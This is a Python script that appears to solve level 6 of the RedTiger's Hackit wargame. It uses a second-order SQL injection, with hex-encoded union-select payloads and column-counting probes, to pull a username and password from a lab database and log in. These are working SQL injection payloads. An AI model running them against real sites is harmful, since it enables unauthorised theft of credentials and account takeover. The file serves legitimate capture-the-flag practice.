#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def str_to_hex(s: str) -> str:
    return '0x' + (s.encode('utf-8')).hex()


def main():
    '''
    Secondary SQL injection

    Target: Get the first user in table level6_users with status 1
    '''
    url = "https://redtiger.labs.overthewire.org/level6.php"
    table_name = 'level6_users'
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level6login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level6login=cooks[level])

    # Counting the number of columns
    p = f"' union select username,username,password,password,password from {table_name} where status=1 #"
    h = str_to_hex(p)
    print(h)

    # Counting the number of columns
    data = dict(user='1 order by %s')
    if not (columns := tg.count_columns(url, data, cook)):
        return False

    # Search for visible columns and desired data
    payload = f"0 union select %s from {table_name} where status=1#"
    data = dict(user=payload)
    if not (keys := tg.find_visible_columns_and_param(url, columns, data, finds,
            cook, type_sqli=2, internal_payload=f"' union select %s from {table_name} where status=1#")):
        return False

    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = req.post_request(url, data, cook)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()





